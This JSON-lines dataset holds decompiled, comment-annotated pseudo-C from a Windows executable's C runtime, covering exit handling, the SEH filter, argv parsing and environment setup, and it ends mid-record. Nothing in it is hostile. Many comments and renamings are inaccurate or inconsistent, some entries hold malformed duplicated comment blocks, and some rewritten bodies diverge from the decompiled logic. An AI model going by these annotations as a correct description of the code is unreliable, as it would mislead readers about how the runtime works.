{"Function Name": "FUN_1400121a8", "Address": "1400121a8", "Source Code": "\nulonglong FUN_1400121a8(undefined1 (*input_array) [32], ulonglong index) {\n    undefined1 (*current_element) [32] = input_array; // Initialize pointer to param_1\n    ulonglong difference, adjusted_value; // Declare variables for calculations\n    undefined1 status_flags[16]; // Array to hold status flags\n\n    if (threshold < 5) { // Check if a certain condition is met\n        if (input_array != (undefined1 (*) [32])(*input_array + index * 2)) { // Compare pointers\n            do {\n                if (*(short *)*current_element == 0) break; // Break if the current value is zero\n                current_element = (undefined1 (*) [32])(*current_element + 2); // Move to the next element\n            } while (current_element != (undefined1 (*) [32])(*input_array + index * 2)); // Continue until the end\n        }\n    } else if (((ulonglong)input_array & 1) == 0) { // Check if param_1 is even\n        adjusted_value = (ulonglong)((uint)input_array & 0xf); // Get the lower 4 bits of param_1\n        adjusted_value = (-(ulonglong)(adjusted_value != 0) & 0x10 - adjusted_value) >> 1; // Calculate adjusted value\n        if (index < adjusted_value) { // Check if param_2 is less than uVar4\n            adjusted_value = index; // Set uVar4 to param_2 if true\n        }\n        if (input_array != (undefined1 (*) [32])(*input_array + adjusted_value * 2)) { // Compare pointers again\n            do {\n                if (*(short *)*current_element == 0) break; // Break if the current value is zero\n                current_element = (undefined1 (*) [32])(*current_element + 2); // Move to the next element\n            } while (current_element != (undefined1 (*) [32])(*input_array + adjusted_value * 2)); // Continue until the end\n        }\n        difference = (longlong)current_element - (longlong)input_array >> 1; // Calculate the difference\n        if (difference != adjusted_value) { // Check if the difference is not equal to uVar4\n            return difference; // Return the difference\n        }\n        for (current_element = (undefined1 (*) [32])(*input_array + difference * 2); // Initialize pauVar3 for the next loop\n             current_element != (undefined1 (*) [32])(*input_array + ((index - adjusted_value & 0xfffffffffffffff0) + difference) * 2); // Loop until the end condition\n             current_element = (undefined1 (*) [32])(*current_element + 0x10)) { // Move to the next element\n            status_flags._0_2_ = -(ushort)(*(short *)*current_element == 0); // Check if current value is zero and set flag\n            status_flags._2_2_ = -(ushort)(*(short *)(*current_element + 2) == 0); // Repeat for next values\n            status_flags._4_2_ = -(ushort)(*(short *)(*current_element + 4) == 0);\n            status_flags._6_2_ = -(ushort)(*(short *)(*current_element + 6) == 0);\n            status_flags._8_2_ = -(ushort)(*(short *)(*current_element + 8) == 0);\n            status_flags._10_2_ = -(ushort)(*(short *)(*current_element + 10) == 0);\n            status_flags._12_2_ = -(ushort)(*(short *)(*current_element + 0xc) == 0);\n            status_flags._14_2_ = -(ushort)(*(short *)(*current_element + 0xe) == 0);\n            if ((((((((((((((((status_flags >> 7 & 1) != 0) || // Check flags for certain conditions\n                              (status_flags >> 0xf & 1) != 0) ||\n                              (status_flags >> 0x17 & 1) != 0) ||\n                              (status_flags >> 0x1f & 1) != 0) ||\n                              (status_flags >> 0x27 & 1) != 0) ||\n                              (status_flags >> 0x2f & 1) != 0) ||\n                              (status_flags >> 0x37 & 1) != 0) ||\n                              (status_flags >> 0x3f & 1) != 0) ||\n                              (status_flags >> 0x47 & 1) != 0) ||\n                              (status_flags >> 0x4f & 1) != 0) ||\n                              (status_flags >> 0x57 & 1) != 0) ||\n                              (status_flags >> 0x5f & 1) != 0) ||\n                              (status_flags >> 0x67 & 1) != 0) ||\n                              (status_flags >> 0x6f & 1) != 0) ||\n                              (status_flags._14_2_ >> 7 & 1) != 0) || \n                              (status_flags._14_2_ & 0x8000) != 0) break; // Break if any condition is met\n        }\n        for (; (current_element != (undefined1 (*) [32])(*input_array + index * 2) && (*(short *)*current_element != 0)); // Loop until the end condition\n             current_element = (undefined1 (*) [32])(*current_element + 2)) { // Move to the next element\n        }\n    } else if (input_array != (undefined1 (*) [32])(*input_array + index * 2)) { // Compare pointers again\n        do {\n            if (*(short *)*current_element == 0) break; // Break if the current value is zero\n            current_element = (undefined1 (*) [32])(*current_element + 2); // Move to the next element\n        } while (current_element != (undefined1 (*) [32])(*input_array + index * 2)); // Continue until the end\n    }\n    return (longlong)current_element - (longlong)input_array >> 1; // Return the final calculated difference\n}\n"}
{"Function Name": "FUN_140012380", "Address": "140012380", "Source Code": "\nvoid FUN_140012380(undefined8 input_value)\n{\n    // Assign the value of param_1 to the global variable _DAT_140039ff0\n    global_variable = input_value;\n}\n"}
{"Function Name": "_callnewh", "Address": "140012388", "Source Code": "\nint __cdecl _callnewh(size_t size)\n{\n    // Retrieve the current new handler function\n    ulonglong newHandler = _query_new_handler();\n    \n    // Check if the new handler is set and if the guard dispatch call is successful\n    if (newHandler != 0 && (*(code *)guardDispatchCall)(size) != 0) {\n        // Return 1 indicating that the new handler was called successfully\n        return 1;\n    }\n    \n    // Return 0 indicating that the new handler was not called\n    return 0;\n}\n"}
{"Function Name": "_query_new_handler", "Address": "1400123b8", "Source Code": "\nulonglong _query_new_handler(void)\n{\n    ulonglong result; // Declare a variable to hold the result\n    __acrt_lock(0); // Acquire a lock to ensure thread safety\n    result = globalVar1 ^ globalVar2; // Perform a bitwise XOR operation on two global variables\n    __acrt_unlock(0); // Release the lock after the operation\n    // Return the result of a bitwise rotation of uVar2 based on the value of DAT_140038080\n    return result >> (globalVar1 & 0x3f) | result << (0x40 - (globalVar1 & 0x3f));\n}\n"}
{"Function Name": "_seh_filter_exe", "Address": "1400123ec", "Source Code": "\nundefined4 seh_filter_execute(int input_value, undefined8 thread_data)\n{\n    undefined4 return_status; // Variable to store a return value or status\n    longlong long_value; // Variable to hold a long long value\n    undefined8 previous_value; // Variable to store a previous value of puVar5[1]\n    undefined8 *thread_storage_ptr; // Pointer to a structure obtained from __acrt_getptd_noexit\n    int *int_array_start; // Pointer to the start of an integer array\n    int *current_int; // Pointer to the current integer in the loop\n    undefined4 error_code; // Variable to store a specific error code\n\n    thread_storage_ptr = (undefined8 *)__acrt_getptd_noexit(); // Get the thread-local storage pointer\n    if (thread_storage_ptr == (undefined8 *)0x0) { // Check if the pointer is null\n        return 0; // Return 0 if no thread-local storage is found\n    }\n    int_array_start = (int *)*thread_storage_ptr; // Get the integer array from the thread-local storage\n    current_int = (int *)0x0; // Initialize piVar6 to null\n\n    // Loop through the integer array to find the matching param_1\n    for (int *iterator = int_array_start; iterator != int_array_start + 0x30 && (current_int = iterator, *iterator != input_value); iterator += 4) {\n    }\n    \n    if (current_int == (int *)0x0) { // Check if no matching integer was found\n        return 0; // Return 0 if no match\n    }\n    \n    long_value = *(longlong *)(current_int + 2); // Get the value at index 2 of the found integer\n    if (long_value == 0) { // Check if the value is 0\n        return 0; // Return 0 if it is\n    }\n    \n    if (long_value == 5) { // Check if the value is 5\n        current_int[2] = 0; // Set index 2 to 0\n        current_int[3] = 0; // Set index 3 to 0\n        return 1; // Return 1\n    }\n    \n    if (long_value == 1) { // Check if the value is 1\n        return 0xffffffff; // Return -1\n    }\n    \n    previous_value = thread_storage_ptr[1]; // Store the current value of puVar5[1]\n    thread_storage_ptr[1] = thread_data; // Update puVar5[1] with param_2\n    \n    if (current_int[1] != 8) { // Check if the value at index 1 is not 8\n        current_int[2] = 0; // Set index 2 to 0\n        current_int[3] = 0; // Set index 3 to 0\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(current_int[1]); // Call a function with the value at index 1\n        goto LAB_14001254e; // Jump to the cleanup section\n    }\n    \n    // Loop through the integer array from index 12 to 30 and reset values\n    for (int *iterator = int_array_start + 0xc; iterator != int_array_start + 0x30; iterator += 4) {\n        iterator[2] = 0; // Set index 2 to 0\n        iterator[3] = 0; // Set index 3 to 0\n    }\n    \n    return_status = *(undefined4 *)(thread_storage_ptr + 2); // Store the value at puVar5[2] in uVar1\n    \n    // Determine the error code based on the value at piVar6\n    if (*current_int == -0x3fffff73) {\n        error_code = 0x82; // Set uVar8 to 0x82\n    } else if (*current_int == -0x3fffff72) {\n        error_code = 0x83; // Set uVar8 to 0x83\n    } else if (*current_int == -0x3fffff71) {\n        error_code = 0x86; // Set uVar8 to 0x86\n    } else if (*current_int == -0x3fffff70) {\n        error_code = 0x81; // Set uVar8 to 0x81\n    } else if (*current_int == -0x3fffff6f) {\n        error_code = 0x84; // Set uVar8 to 0x84\n    } else if (*current_int == -0x3fffff6e) {\n        error_code = 0x8a; // Set uVar8 to 0x8a\n    } else if (*current_int == -0x3fffff6d) {\n        error_code = 0x85; // Set uVar8 to 0x85\n    } else if (*current_int == -0x3ffffd4c) {\n        error_code = 0x8e; // Set uVar8 to 0x8e\n    } else if (*current_int == -0x3ffffd4b) {\n        error_code = 0x8d; // Set uVar8 to 0x8d\n    } else {\n        error_code = return_status; // Default to uVar1 if no match\n    }\n    \n    (*(code *)PTR__guard_dispatch_icall_1400213e8)(8, error_code); // Call a function with parameters 8 and uVar8\n    *(undefined4 *)(thread_storage_ptr + 2) = return_status; // Restore the original value at puVar5[2]\n    \nLAB_14001254e: // Cleanup label\n    thread_storage_ptr[1] = previous_value; // Restore the original value of puVar5[1]\n    return 0xffffffff; // Return -1\n}\n"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_d80eeec6fff315bfe5c115232f3240e3>,class_<lambda_6e4b09c48022b2350581041d5f6b0c4c>&___ptr64,class_<lambda_2358e3775559c9db80273638284d5e45>_>", "Address": "140012570", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_d80eeec6fff315bfe5c115232f3240e3>,class_<lambda_6e4b09c48022b2350581041d5f6b0c4c>&___ptr64,class_<lambda_2358e3775559c9db80273638284d5e45>_>\n(__crt_seh_guarded_call<void> *this, // Pointer to the current instance of __crt_seh_guarded_call\n<lambda_d80eeec6fff315bfe5c115232f3240e3> *param_1, // Pointer to the first lambda parameter\n<lambda_6e4b09c48022b2350581041d5f6b0c4c> *param_2, // Pointer to the second lambda parameter\n<lambda_2358e3775559c9db80273638284d5e45> *param_3) // Pointer to the third lambda parameter\n{\n    __acrt_lock(*(int *)param_1); // Locking mechanism using the first parameter\n    param_2->operator()(); // Invoking the operator() of the second lambda\n    __acrt_unlock(*(int *)param_3); // Unlocking mechanism using the third parameter\n}\n*\\ \n \n\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_d80eeec6fff315bfe5c115232f3240e3>,class_<lambda_6e4b09c48022b2350581041d5f6b0c4c>&___ptr64,class_<lambda_2358e3775559c9db80273638284d5e45>_>\n(__crt_seh_guarded_call<void> *this,<lambda_d80eeec6fff315bfe5c115232f3240e3> *param_1,\n<lambda_6e4b09c48022b2350581041d5f6b0c4c> *param_2,\n<lambda_2358e3775559c9db80273638284d5e45> *param_3)\n{\n    __acrt_lock(*(int *)param_1);\n    param_2->operator()();\n    __acrt_unlock(*(int *)param_3);\n}\n"}
{"Function Name": "<lambda_6e4b09c48022b2350581041d5f6b0c4c>::operator()", "Address": "1400125a8", "Source Code": "\nvoid __thiscall\n<lambda_6e4b09c48022b2350581041d5f6b0c4c>::operator()\n(<lambda_6e4b09c48022b2350581041d5f6b0c4c> *this)\n{\n    // Check if the global variable DAT_14003a008 is not zero\n    if (DAT_14003a008 != '\\0') {\n        return; // Exit if the condition is met\n    }\n    \n    LOCK(); // Acquire a lock to ensure thread safety\n    DAT_140039ff8 = 1; // Set a global variable to indicate a state\n    UNLOCK(); // Release the lock\n    \n    // Check if the first element pointed to by 'this' is zero\n    if (**(int **)this == 0) {\n        // Check if DAT_14003a000 is not equal to DAT_140038080\n        if (DAT_14003a000 != DAT_140038080) {\n            // Call a function via a function pointer with parameters 0, 0, 0\n            (*(code *)PTR__guard_dispatch_icall_1400213e8)(0, 0, 0);\n        }\n        // Execute the on-exit table for a specific data segment\n        _execute_onexit_table(&DAT_14003a240);\n    } else {\n        // Check if the first element pointed to by 'this' is equal to 1\n        if (**(int **)this == 1) {\n            // Execute the on-exit table for another specific data segment\n            _execute_onexit_table(&DAT_14003a258);\n        }\n    }\n\n    // Check again if the first element pointed to by 'this' is zero\n    if (**(int **)this == 0) {\n        // Initialize a range of data\n        _initterm((undefined8 *)&DAT_1400214e8, (undefined8 *)&DAT_140021508);\n    }\n    // Initialize another range of data\n    _initterm((undefined8 *)&DAT_140021510, (undefined8 *)&DAT_140021518);\n    \n    // Check if the second element pointed to by 'this' is zero\n    if (**(int **)(this + 8) == 0) {\n        DAT_14003a008 = '\\x01'; // Set the global variable to indicate a state\n        **(undefined1 **)(this + 0x10) = 1; // Set a value in the memory pointed to by 'this'\n    }\n}\n"}
{"Function Name": "FUN_14001266c", "Address": "14001266c", "Source Code": "\n// Function that checks if the input parameter is equal to a specific constant value\nbool FUN_14001266c(int input_value)\n{\n    // Return true if param_1 is equal to -0x1f928c9d, otherwise return false\n    return input_value == -0x1f928c9d;\n}\n"}
{"Function Name": "common_exit", "Address": "140012678", "Source Code": "\nvoid __cdecl common_exit(int exit_code, _crt_exit_cleanup_mode cleanup_mode, _crt_exit_return_mode return_mode)\n{\n    code *function_pointer; // Pointer to a function code\n    HMODULE module_handle; // Handle to a module\n    int *integer_pointer; // Pointer to an integer\n    _crt_exit_cleanup_mode cleanup_mode_storage[2]; // Local storage for cleanup mode\n    _crt_exit_return_mode return_mode_storage[2]; // Local storage for return mode\n    __crt_seh_guarded_call<void> seh_guarded_call_storage[4]; // SEH guarded call storage\n    undefined4 initialized_value = 2; // Local variable initialized to 2\n    undefined4 initialized_array[2] = {2, 0}; // Local array initialized with values 2 and 0\n\n    cleanup_mode_storage[0] = cleanup_mode; // Store the cleanup mode parameter\n    return_mode_storage[0] = return_mode; // Store the return mode parameter\n\n    if (return_mode == 0) { // Check if return mode is 0\n        module_handle = GetModuleHandleW((LPCWSTR)0x0); // Get handle to the current module\n        // Check if the module handle is valid and if it meets certain criteria\n        if ((((module_handle != (HMODULE)0x0) && ((short)module_handle->unused == 0x5a4d)) &&\n            (integer_pointer = (int *)((longlong)&module_handle->unused + (longlong)module_handle[0xf].unused),\n            *integer_pointer == 0x4550)) &&\n            ((((short)integer_pointer[6] == 0x20b && (0xe < (uint)integer_pointer[0x21])) && (integer_pointer[0x3e] != 0)))) {\n            try_cor_exit_process(exit_code); // Call function to exit process if conditions are met\n        }\n    }\n\n    // Perform a SEH guarded call with specified parameters\n    __crt_seh_guarded_call<void>::operator()<class_<lambda_d80eeec6fff315bfe5c115232f3240e3>, class_<lambda_6e4b09c48022b2350581041d5f6b0c4c>&___ptr64, class_<lambda_2358e3775559c9db80273638284d5e45>_>(seh_guarded_call_storage, \n        (class_<lambda_d80eeec6fff315bfe5c115232f3240e3> *)initialized_array,\n        (_crt_exit_cleanup_mode **)&cleanup_mode_storage,\n        (undefined4 *)&initialized_value);\n\n    if (return_mode_storage[0] != 0) { // Check if return mode indicates to skip termination\n        return; // Exit the function early\n    }\n    \n    exit_or_terminate_process(exit_code); // Call function to exit or terminate the process\n    function_pointer = (code *)swi(3); // Get the address of the system call\n    (*function_pointer)(); // Call the system function\n    return; // Return from the function\n}\n"}
{"Function Name": "exit_or_terminate_process", "Address": "140012734", "Source Code": "\nvoid __cdecl exit_or_terminate_process(uint exit_code)\n{\n    // Check if the process end policy is not set to 1 and a specific flag in the Process Environment Block is not set\n    if (get_process_end_policy() != 1 && (*(uint *)((longlong)process_env_block + 0xbc) >> 8 & 1) == 0) {\n        // Terminate the current process with the specified exit code\n        terminate_process(get_current_process(), exit_code);\n    }\n    // Attempt to call a custom exit process function with the specified exit code\n    attempt_custom_exit(exit_code);\n    // Exit the process with the specified exit code\n    exit_process(exit_code);\n}\n"}
{"Function Name": "try_cor_exit_process", "Address": "140012780", "Source Code": "\nvoid __cdecl try_cor_exit_process(uint exitCode)\n{\n    FARPROC functionPointer; // Declare a variable to hold the function pointer\n    HMODULE moduleHandle = (HMODULE)0x0; // Initialize module handle to null\n\n    // Attempt to get a handle to the mscoree.dll module\n    if (GetModuleHandleExW(0, L\"mscoree.dll\", &moduleHandle) != 0) {\n        // Retrieve the address of the CorExitProcess function\n        functionPointer = GetProcAddress(moduleHandle, \"CorExitProcess\");\n        // Check if the function address was successfully retrieved\n        if (functionPointer != (FARPROC)0x0) {\n            // Call the CorExitProcess function with the provided parameter\n            (*(code *)PTR__guard_dispatch_icall_1400213e8)(exitCode);\n        }\n    }\n    // If the module handle is not null, free the loaded module\n    if (moduleHandle != (HMODULE)0x0) {\n        FreeLibrary(moduleHandle);\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_1400127dc", "Address": "1400127dc", "Source Code": "\nvoid FUN_1400127dc(undefined8 input_value) // Function definition with a single parameter\n{\n    global_variable = input_value; // Assign the value of param_1 to the global variable DAT_14003a000\n}\n"}
{"Function Name": "_cexit", "Address": "1400127f4", "Source Code": "\n// Function definition for _cexit\nvoid __cdecl exitFunction(void)\n{\n    // Call common_exit with parameters 0, 0, and 1\n    exitHandler(0, 0, 1);\n}\n"}
{"Function Name": "FUN_140012804", "Address": "140012804", "Source Code": "\nvoid FUN_140012804(int exit_code) // Function definition with an integer parameter\n{\n    common_exit(exit_code, 2, 0); // Call to common_exit with param_1, 2, and 0 as arguments\n}\n"}
{"Function Name": "_register_thread_local_exe_atexit_callback", "Address": "140012810", "Source Code": "\nvoid _register_thread_local_exe_atexit_callback(ulonglong thread_local_param)\n{\n    // Check if the global variable DAT_14003a000 is equal to DAT_140038080\n    if (global_variable_a == global_variable_b) {\n        // Update DAT_14003a000 with a bitwise operation involving param_1 and DAT_140038080\n        global_variable_a = (thread_local_param >> (0x40 - ((byte)global_variable_b & 0x3f) & 0x3f) | \n                            thread_local_param << (0x40 - (0x40 - ((byte)global_variable_b & 0x3f) & 0x3f))) ^ \n                            global_variable_b;\n        // Exit the function early if the condition is met\n        return;\n    }\n    // Call terminate() if the condition is not met\n    terminate();\n    // Call a function via a software interrupt (swi) with the argument 3\n    ((code *)swi(3))();\n}\n"}
{"Function Name": "FUN_14001284c", "Address": "14001284c", "Source Code": "\nvoid FUN_14001284c(int exitCode)\n{\n    // Call the common_exit function with param_1 and two additional parameters set to 0\n    common_exit(exitCode, 0, 0);\n}\n"}
{"Function Name": "parse_command_line<wchar_t>", "Address": "140012858", "Source Code": "\\*\nvoid __cdecl\nparse_command_line<wchar_t>\n(wchar_t *param_1,wchar_t **param_2,wchar_t *param_3,__uint64 *param_4,__uint64 *param_5)\n{\n    bool bVar1 = false; // Flag to track if we are inside quotes\n    *param_5 = 0; // Initialize the count of parsed characters\n    *param_4 = 1; // Initialize the count of command line arguments\n\n    // If param_2 is not null, store the initial command line argument\n    if (param_2 != (wchar_t **)0x0) {\n        *param_2++ = param_3; // Point to the first argument\n    }\n\n    // Loop through each character in the command line input\n    do {\n        if (*param_1 == L'\\\"') {\n            bVar1 = !bVar1; // Toggle the quote flag\n        } else {\n            (*param_5)++; // Increment the character count\n            if (param_3 != (wchar_t *)0x0) {\n                *param_3++ = *param_1; // Store the character in param_3\n            }\n        }\n    } while ((*param_1++ != L'\\0') && (bVar1 || (*param_1 != L' ' && *param_1 != L'\\t'))); // Continue until end of string or whitespace outside quotes\n\n    // Null-terminate the last argument if param_3 is not null\n    if (param_3 != (wchar_t *)0x0) {\n        param_3[-1] = L'\\0'; // Set the last character to null\n    }\n\n    // Process remaining characters after the first argument\n    while (*param_1 != L'\\0') {\n        // Skip whitespace characters\n        while ((*param_1 == L' ' || *param_1 == L'\\t')) {\n            param_1++; // Move to the next character\n        }\n        if (*param_1 == L'\\0') break; // Exit if end of string is reached\n\n        // If param_2 is not null, store the next argument\n        if (param_2 != (wchar_t **)0x0) {\n            *param_2++ = param_3; // Point to the next argument\n        }\n        (*param_4)++; // Increment the argument count\n\n        wchar_t wVar5 = *param_1; // Store the current character\n        bool escaped = false; // Flag to track escape sequences\n\n        // Loop to process characters of the current argument\n        while (true) {\n            if (*param_1 == L'\\\\') {\n                escaped = !escaped; // Toggle escape flag\n                param_1++; // Move to the next character\n            } else if (*param_1 == L'\\\"' && !escaped) {\n                bVar1 = !bVar1; // Toggle the quote flag if not escaped\n                param_1++; // Move to the next character\n                break; // Exit the loop on closing quote\n            } else {\n                if (param_3 != (wchar_t *)0x0) {\n                    *param_3++ = *param_1; // Store the character in param_3\n                }\n                (*param_5)++; // Increment the character count\n                param_1++; // Move to the next character\n            }\n            // Break if end of string or whitespace outside quotes is reached\n            if (*param_1 == L'\\0' || (!bVar1 && (*param_1 == L' ' || *param_1 == L'\\t'))) break;\n        }\n        // Null-terminate the current argument if param_3 is not null\n        if (param_3 != (wchar_t *)0x0) {\n            *param_3 = L'\\0'; // Set the last character to null\n            param_3++; // Move to the next position\n        }\n        (*param_5)++; // Increment the character count for the argument\n    }\n\n    // Null-terminate the list of arguments if param_2 is not null\n    if (param_2 != (wchar_t **)0x0) {\n        *param_2 = (wchar_t *)0x0; // Set the last argument pointer to null\n    }\n    (*param_4)++; // Increment the argument count for the final null entry\n    return; // Exit the function\n}\n*\\ \n \n\nvoid __cdecl\nparse_command_line<wchar_t>\n(wchar_t *param_1,wchar_t **param_2,wchar_t *param_3,__uint64 *param_4,__uint64 *param_5)\n{\nbool bVar1 = false;\n*param_5 = 0;\n*param_4 = 1;\n\nif (param_2 != (wchar_t **)0x0) {\n    *param_2++ = param_3;\n}\n\ndo {\n    if (*param_1 == L'\\\"') {\n        bVar1 = !bVar1;\n    } else {\n        (*param_5)++;\n        if (param_3 != (wchar_t *)0x0) {\n            *param_3++ = *param_1;\n        }\n    }\n} while ((*param_1++ != L'\\0') && (bVar1 || (*param_1 != L' ' && *param_1 != L'\\t')));\n\nif (param_3 != (wchar_t *)0x0) {\n    param_3[-1] = L'\\0';\n}\n\nwhile (*param_1 != L'\\0') {\n    while ((*param_1 == L' ' || *param_1 == L'\\t')) {\n        param_1++;\n    }\n    if (*param_1 == L'\\0') break;\n\n    if (param_2 != (wchar_t **)0x0) {\n        *param_2++ = param_3;\n    }\n    (*param_4)++;\n\n    wchar_t wVar5 = *param_1;\n    bool escaped = false;\n\n    while (true) {\n        if (*param_1 == L'\\\\') {\n            escaped = !escaped;\n            param_1++;\n        } else if (*param_1 == L'\\\"' && !escaped) {\n            bVar1 = !bVar1;\n            param_1++;\n            break;\n        } else {\n            if (param_3 != (wchar_t *)0x0) {\n                *param_3++ = *param_1;\n            }\n            (*param_5)++;\n            param_1++;\n        }\n        if (*param_1 == L'\\0' || (!bVar1 && (*param_1 == L' ' || *param_1 == L'\\t'))) break;\n    }\n    if (param_3 != (wchar_t *)0x0) {\n        *param_3 = L'\\0';\n        param_3++;\n    }\n    (*param_5)++;\n}\n\nif (param_2 != (wchar_t **)0x0) {\n    *param_2 = (wchar_t *)0x0;\n}\n(*param_4)++;\nreturn;\n}\n"}
{"Function Name": "__acrt_allocate_buffer_for_argv", "Address": "1400129fc", "Source Code": "\nLPVOID __acrt_allocate_buffer_for_argv(ulonglong max_value, ulonglong current_limit, ulonglong size_factor)\n{\n    LPVOID allocated_memory; // Pointer to hold the allocated memory address\n\n    // Check if param_1 is less than a specific maximum value and param_2 is within a calculated limit\n    if ((max_value < 0x1fffffffffffffff) && (current_limit < SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / size_factor, 0))) {\n        \n        // Check if the product of param_2 and param_3 is less than the negation of param_1 multiplied by 8\n        if (current_limit * size_factor < ~(max_value * 8)) {\n            // Allocate memory for the buffer using calloc, with size based on param_1 and param_2\n            allocated_memory = _calloc_base(max_value * 8 + current_limit * size_factor, 1);\n            _free_base((LPVOID)0x0); // Free the base memory (not used here)\n            return allocated_memory; // Return the allocated memory pointer\n        }\n    }\n    \n    return (LPVOID)0x0; // Return null pointer if conditions are not met\n}\n"}
{"Function Name": "_configure_wide_argv", "Address": "140012a5c", "Source Code": "\nint _configure_wide_argv(int arg_count) // Function to configure wide character arguments\n{\n    int return_value; // Variable to hold return value from wildcard expansion\n    ulong *error_number_ptr; // Pointer to store error number\n    wchar_t **arg_array; // Pointer to wide character argument array\n    wchar_t **expanded_arg_array; // Pointer for expanded wide character argument array\n    int init_return_value = 0; // Return value initialization\n    wchar_t *command_line; // Pointer to wide character string\n\n    if (arg_count != 0) { // Check if param_1 is not zero\n        if (arg_count - 1U < 2) { // Check if param_1 is 1 or 2\n            GetModuleFileNameW((HMODULE)0x0, (LPWSTR)&DAT_14003a010, 0x104); // Retrieve the module file name\n            _DAT_14003a9b0 = &DAT_14003a010; // Store the module file name in a global variable\n            // Determine the command line to parse\n            command_line = (DAT_14003a9d8 == (wchar_t *)0x0 || *DAT_14003a9d8 == L'\\0') ? (wchar_t *)&DAT_14003a010 : DAT_14003a9d8;\n\n            __uint64 arg_count_result = 0; // Variable to store the number of arguments\n            __uint64 arg_size_result = 0; // Variable to store the size of arguments\n            parse_command_line<wchar_t>(command_line, (wchar_t **)0x0, (wchar_t *)0x0, &arg_count_result, &arg_size_result); // Parse the command line\n            arg_array = (wchar_t **)__acrt_allocate_buffer_for_argv(arg_count_result, arg_size_result, 2); // Allocate buffer for arguments\n            if (arg_array == (wchar_t **)0x0) { // Check if allocation failed\n                error_number_ptr = __doserrno(); // Get the error number\n                init_return_value = 0xc; // Set error code\n                *error_number_ptr = 0xc; // Store error number\n                _free_base((LPVOID)0x0); // Free base memory\n            } else {\n                parse_command_line<wchar_t>(command_line, arg_array, (wchar_t *)(arg_array + arg_count_result), &arg_count_result, &arg_size_result); // Parse command line into allocated buffer\n                if (arg_count == 1) { // Check if param_1 is 1\n                    _DAT_14003a9b8 = (int)arg_count_result - 1; // Store the number of arguments\n                    DAT_14003a9c8 = arg_array; // Store the argument array\n                } else {\n                    wchar_t **wildcard_expanded_args = (wchar_t **)0x0; // Pointer for wildcard expanded arguments\n                    return_value = common_expand_argv_wildcards<wchar_t>(arg_array, &wildcard_expanded_args); // Expand wildcards in arguments\n                    expanded_arg_array = wildcard_expanded_args; // Store the result of wildcard expansion\n                    if (return_value != 0) { // Check if expansion failed\n                        _free_base(wildcard_expanded_args); // Free memory for expanded arguments\n                        _free_base(arg_array); // Free original argument buffer\n                        return return_value; // Return error code\n                    }\n                    _DAT_14003a9b8 = 0; // Reset argument count\n                    while (*expanded_arg_array != (wchar_t *)0x0) { // Count the number of expanded arguments\n                        _DAT_14003a9b8++; // Increment argument count\n                        expanded_arg_array++; // Move to the next argument\n                    }\n                    DAT_14003a9c8 = wildcard_expanded_args; // Store the expanded argument array\n                    _free_base((LPVOID)0x0); // Free base memory\n                }\n                _free_base(arg_array); // Free the original argument buffer\n            }\n        }\n    } else {\n        error_number_ptr = __doserrno(); // Get the error number\n        init_return_value = 0x16; // Set error code for invalid parameter\n        *error_number_ptr = 0x16; // Store error number\n        FUN_14000ecf8(); // Call error handling function\n    }\n    return init_return_value; // Return the result\n}\n"}
{"Function Name": "common_initialize_environment_nolock<wchar_t>", "Address": "140012be0", "Source Code": "\\*\nint __cdecl common_initialize_environment_nolock<wchar_t>(void)\n{\n    int returnStatus = 0; // Initialize return value to 0\n    wchar_t *environmentString; // Pointer for wide character environment string\n\n    // Check if the global environment variable pointer is null\n    if (globalEnvironmentPointer == (wchar_t **)0x0) {\n        // Retrieve the wide character environment from the OS\n        environmentString = (wchar_t *)__dcrt_get_wide_environment_from_os();\n        // Check if the environment retrieval was unsuccessful\n        if (environmentString == (wchar_t *)0x0) {\n            returnStatus = -1; // Set return value to -1 on failure\n        } else {\n            // Create a new environment from the retrieved wide character string\n            wchar_t **newEnvironmentPointer = create_environment<wchar_t>(environmentString);\n            // Check if the environment creation was unsuccessful\n            if (newEnvironmentPointer == (wchar_t **)0x0) {\n                returnStatus = -1; // Set return value to -1 on failure\n                newEnvironmentPointer = globalEnvironmentPointer; // Fallback to existing environment pointer\n            }\n            // Update global pointers to the newly created environment\n            globalNewEnvironmentPointer = newEnvironmentPointer;\n            globalEnvironmentPointer = newEnvironmentPointer;\n            // Free the base pointer (not used)\n            _free_base((LPVOID)0x0);\n        }\n        // Free the memory allocated for the wide character environment string\n        _free_base(environmentString);\n    }\n    \n    return returnStatus; // Return the status of the initialization\n}\n*\\ \n \n\nint __cdecl common_initialize_environment_nolock<wchar_t>(void)\n{\n    int returnStatus = 0;\n    wchar_t *environmentString;\n\n    if (globalEnvironmentPointer == (wchar_t **)0x0) {\n        environmentString = (wchar_t *)__dcrt_get_wide_environment_from_os();\n        if (environmentString == (wchar_t *)0x0) {\n            returnStatus = -1;\n        } else {\n            wchar_t **newEnvironmentPointer = create_environment<wchar_t>(environmentString);\n            if (newEnvironmentPointer == (wchar_t **)0x0) {\n                returnStatus = -1;\n                newEnvironmentPointer = globalEnvironmentPointer;\n            }\n            globalNewEnvironmentPointer = newEnvironmentPointer;\n            globalEnvironmentPointer = newEnvironmentPointer;\n            _free_base((LPVOID)0x0);\n        }\n        _free_base(environmentString);\n    }\n    \n    return returnStatus;\n}\n"}
{"Function Name": "create_environment<wchar_t>", "Address": "140012c48", "Source Code": "\\*\nwchar_t ** __cdecl create_environment<wchar_t>(wchar_t *param_1)\n{\n    wchar_t **currentEnvVarPtr; // Pointer to the current environment variable\n    wchar_t **allocatedEnvArrayPtr; // Pointer to the allocated environment array\n    wchar_t *individualEnvVarStrPtr;   // Pointer for individual environment variable strings\n    wchar_t **variableCountPtr = (wchar_t **)0x0; // Pointer to track the number of variables\n    wchar_t currentChar = *param_1; // Current character from the input string\n\n    // Loop until the end of the input string\n    while (currentChar != L'\\0') {\n        currentEnvVarPtr = (wchar_t **)((longlong)variableCountPtr + 1); // Increment the variable count\n        if (currentChar == L'=') { // Check if the current character is '='\n            currentEnvVarPtr = variableCountPtr; // If so, do not increment the count\n        }\n        longlong variableLengthIndex = -1; // Initialize index for variable length calculation\n        do {\n            variableLengthIndex++; // Increment index\n        } while (param_1[variableLengthIndex] != L'\\0'); // Continue until null terminator\n        param_1 += variableLengthIndex + 2; // Move to the next variable in the input string\n        variableCountPtr = currentEnvVarPtr; // Update the count of 